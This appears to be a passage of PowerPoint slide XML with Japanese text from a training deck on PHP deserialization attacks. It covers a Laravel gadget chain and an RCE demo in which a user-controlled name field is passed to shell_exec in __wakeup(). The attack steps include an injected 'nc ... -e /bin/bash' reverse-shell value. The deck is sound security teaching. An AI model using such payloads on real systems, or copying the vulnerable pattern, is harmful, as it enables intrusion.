          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8051800" y="2000250"/>
            <a:ext cx="355600" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 6" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8597900" y="1543050"/>
            <a:ext cx="1270000" cy="571500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8547795" y="2178050"/>
            <a:ext cx="1370112" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SINK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>system() / eval() / SQL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="2841625"/>
            <a:ext cx="10560050" cy="1073150"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 7988"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="3022600"/>
            <a:ext cx="10399395" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>例：Laravel/RCE9（PHPGGC）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="3281660"/>
            <a:ext cx="10399395" cy="218380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>PendingBroadcast.__destruct() → Dispatcher.dispatch() → call_user_func() → … → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>system($cmd)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1047750" y="3538141"/>
            <a:ext cx="10399395" cy="215900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>各段は「既にベンダーコード内に実在するメソッド」。攻撃者は新しいコードを注入するのではなく、既存の処理を狙った順序で“呼び出させる”だけ</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7F6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCE実演：__wakeup() のコマンドインジェクション</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1454150"/>
            <a:ext cx="5187950" cy="4387850"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2315"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="1657350"/>
            <a:ext cx="4924997" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>app/Helpers/UserSettings.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1019175" y="1927225"/>
            <a:ext cx="4775200" cy="1560413"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3866"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1D2126"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2B3036"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="87106" tIns="87106" rIns="0" bIns="61706" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>public function __wakeup() {</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  shell_exec(</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>    'echo "...Imported settings</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>    for user \'' . $this-&gt;getName()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>    . '\'" &gt;&gt; /tmp/htbank.log'</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  );</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1520"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1016000" y="3579713"/>
            <a:ext cx="4924997" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Name はユーザー制御・無フィルタでシェルコマンドに結合</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6181725" y="1457325"/>
            <a:ext cx="5194300" cy="4381500"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2246"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="1663700"/>
            <a:ext cx="4924997" cy="212030"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1470"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>攻撃手順</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6480175" y="1939230"/>
            <a:ext cx="4825302" cy="1018381"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" marL="161925" indent="-161925">
              <a:lnSpc>
                <a:spcPts val="1955"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Name を </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>"; nc ... -e /bin/bash;#</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> に設定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="161925" indent="-161925">
              <a:lnSpc>
                <a:spcPts val="1955"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ローカル環境（target.php）で事前検証</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="161925" indent="-161925">
              <a:lnSpc>
                <a:spcPts val="1955"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ペイロードをImportしてデシリアライズをトリガー</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="161925" indent="-161925">
              <a:lnSpc>
                <a:spcPts val="1955"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buFontTx/>
              <a:buAutoNum type="arabicPeriod" startAt="1"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>__wakeup() 実行時にコマンドインジェクション成立 → リバースシェル取得</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="3021112"/>
            <a:ext cx="4924997" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>根本原因：ユーザー制御文字列をエスケープ/検証なしでシェルコマンドに連結（CWE-78）</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7F6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCE以外の影響：SQLi / LFI / DoS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1454150"/>
            <a:ext cx="10883392" cy="247650"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>影響はマジックメソッドが「何に」値を渡すかで決まる。RCEは数ある結果の一つにすぎない</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1882775"/>
            <a:ext cx="3414117" cy="3956050"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2511"/>
